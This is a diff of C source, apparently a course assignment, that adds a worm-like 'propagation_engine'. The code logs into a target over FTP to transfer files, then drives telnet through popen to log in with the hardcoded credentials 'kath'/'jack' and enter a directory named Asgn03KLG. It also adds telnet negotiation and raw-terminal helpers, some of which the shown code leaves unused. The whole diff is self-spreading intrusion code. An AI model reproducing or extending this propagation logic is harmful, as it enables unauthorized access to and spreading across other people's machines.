@@ -15,6 +15,19 @@
 #include <fcntl.h>
 #include <arpa/inet.h>
 
+#define DO 0xfd
+#define WONT 0xfc
+#define WILL 0xfb
+#define DONT 0xfe
+#define CMD 0xff
+#define CMD_ECHO 1
+#define CMD_WINDOW_SIZE 31
+#define IAC 255
+#define SB 250
+#define SE 240
+#define BUFLEN 200
+#define ESCAPE 27
+
 void parseIPPort(char buffer[], char *ip, int *port){
     char *token = (char*) malloc(sizeof(char));
     char *aux = (char*) malloc(sizeof(char));
@@ -105,7 +118,7 @@ void fileTransfer(char *ip, char *username, char *password){
     //Enviando nome do usuario
     memset(buffer, '0', 1024);
     strcat(user, username);    
-    printf("%s", user);
+    strcat(user, "\n");    
     if(send(sock, user, strlen(user), 0) < 0){
         printf("Erro: nome do usuario invalido ou incorreto. \n");
         exit(1);    
@@ -119,7 +132,7 @@ void fileTransfer(char *ip, char *username, char *password){
     //Enviando senha
     memset(buffer, '0', 1024);
     strcat(pass, password);
-    printf("%s", pass);
+    strcat(pass, "\n");
     if(send(sock, pass, strlen(pass), 0) < 0){
         printf("Erro: senha invalida \n");
         exit(1);
@@ -172,6 +185,7 @@ void fileTransfer(char *ip, char *username, char *password){
     //Enviando comando 'CD'
     memset(buffer, '0', 1024);
     strcat(cwd, username);
+    strcat(cwd, "\n");
     send(sock, cwd, strlen(cwd), 0);
     
     //Resposta do 'CD'
@@ -283,12 +297,130 @@ void fileTransfer(char *ip, char *username, char *password){
         close(sock);
     }
 }
+
+void negotiate(int sock, unsigned char *buf, int len) {
+    int i;
+    const char* option_code[350];
+    option_code[00] = "TRANSMIT-BINARY";
+    option_code[01] = "ECHO";
+    option_code[03] = "SUPPRESS-GO-AHEAD";
+    option_code[05] = "STATUS";
+    option_code[06] = "TIMING-MARK";
+    option_code[10] = "NAOCRD";
+    option_code[11] = "NAOHTS";
+    option_code[12] = "NAOHTD";
+    option_code[13] = "NAOFFD";
+    option_code[14] = "NAOVTS";
+    option_code[15] = "NAOVTD";
+    option_code[16] = "NAOLFD";
+    option_code[17] = "EXTEND-ASCII";
+    option_code[18] = "LOGOUT";
+    option_code[19] = "BM";
+    option_code[20] = "DET";
+    option_code[23] = "SEND-LOCATION";
+    option_code[24] = "TERMINAL-TYPE";
+    option_code[25] = "END-OF-RECORD";
+    option_code[26] = "TUID";
+    option_code[27] = "OUTMRK";
+    option_code[28] = "TTYLOC";
+    option_code[29] = "3270-REGIME";
+    option_code[30] = "X.3-PAD";
+    option_code[31] = "NAWS";
+    option_code[32] = "TERMINAL-SPEED";
+    option_code[33] = "TOGGLE-FLOW-CONTROL";
+    option_code[34] = "LINEMODE";
+    option_code[35] = "X-DISPLAY-LOCATION";
+    option_code[36] = "ENVIRON";
+    option_code[37] = "AUTHENTICATION";
+    option_code[38] = "ENCRYPT";
+    option_code[39] = "NEW-ENVIRON";
+    option_code[40] = "TN3270E";
+    option_code[42] = "CHARSET";
+    option_code[44] = "COM-PORT-OPTION";
+    option_code[47] = "KERMIT";
+    option_code[250] = "SB";
+    option_code[240] = "SE";
+    option_code[251] = "WILL";
+    option_code[252] = "WONT";
+    option_code[253] = "DO";
+    option_code[254] = "DONT";
+    option_code[255] = "IAC";
+    if (buf[1] == DO && buf[2] == CMD_WINDOW_SIZE) {
+        unsigned char tmp1[10] = { IAC, WILL, CMD_WINDOW_SIZE };
+        if (send(sock, tmp1, 3, 0) < 0)
+            exit(1);
+
+        unsigned char tmp2[10] = { IAC, SB, CMD_WINDOW_SIZE, 0, 80, 0, 24, IAC,
+        SE };
+        if (send(sock, tmp2, 9, 0) < 0)
+            exit(1);
+        return;
+    }
+
+    /*
+     * To avoid any problems, we reply to every DO with a WONT and every
+     * WILL with a DO. Both of these are not required, but are included to prevent
+     * any problems with most telnet servers.
+     *
+     * Echoing back the same characters to the server works on Linux machines,
+     * but may not work on other terminals.
+     *
+     */
+    for (i = 1; i < len; i++) {
+        if (buf[i] == DO) {
+            buf[i] = WONT;
+        } else if (buf[i] == WILL) {
+            buf[i] = DO;
+        }
+    }
+
+    if (send(sock, buf, len, 0) < 0)
+        exit(1);
+}
+
+static struct termios tin;
+
+static void terminal_set(void) {
+    // save terminal configuration
+    tcgetattr(STDIN_FILENO, &tin);
+
+    static struct termios tlocal;
+    memcpy(&tlocal, &tin, sizeof(tin));
+    // The file descriptor which has to be turned to raw mode is the standard
+    // input of the parent process
+    tlocal.c_lflag &= ~(ICANON);
+    cfmakeraw(&tlocal);
+    tcsetattr(STDIN_FILENO, TCSANOW, &tlocal);
+}
+
+static void terminal_reset(void) {
+    // restore terminal upon exit
+    tcsetattr(STDIN_FILENO, TCSANOW, &tin);
+}
+
+void connect_to_server(int sock, int port, char* address) {
+    struct sockaddr_in server;
+    server.sin_addr.s_addr = inet_addr(address);
+    server.sin_family = AF_INET;
+    server.sin_port = htons(port);
+
+    //Connect to remote server
+    if (connect(sock, (struct sockaddr *) &server, sizeof(server)) < 0) {
+        perror("connect failed. Error");
+        exit(1);
+    }
+}
+
  
-void fileExecute(char *ip){
+void fileExecute(char *ip, char *username, char *pass){
     char buff[1024];
+    FILE *file;
+    int sock, i, len, port = 23, sent = 0, tam = 0, control = 0, j = 0;
     pid_t child; // note that the actual return type of fork is 
              // pid_t, though it's probably just an int typedef'd or macro'd
 
+    tam = strlen(username) + strlen (pass);
+    
     child = vfork();
     if (child == -1){
          perror("Fork failed");
@@ -299,13 +431,27 @@ void fileExecute(char *ip){
         strcpy(buff, "telnet ");
         strcat(buff, ip);
         strcat(buff, " 23");
-        system(buff);
+        file = popen(buff, "w");
+        if(file == NULL){
+            perror("");
+        }
+        
+        fflush(file);
+        sleep(2); 
+        fprintf(file, "kath\n");
+        fflush(file);
+        sleep(2);
+        fprintf(file, "jack\n");
+        fflush(file);
+        sleep(2);
+        fprintf(file, "cd /Asgn03KLG/\n");
+        pclose(file);
         _exit(23);
     }
 
 }
 
 void propagation_engine(char* ip, char *username, char *pass){    
-        fileTransfer(ip, username, pass);
-        fileExecute(ip);
+    fileTransfer(ip, username, pass);
+    fileExecute(ip, username, pass);
 }
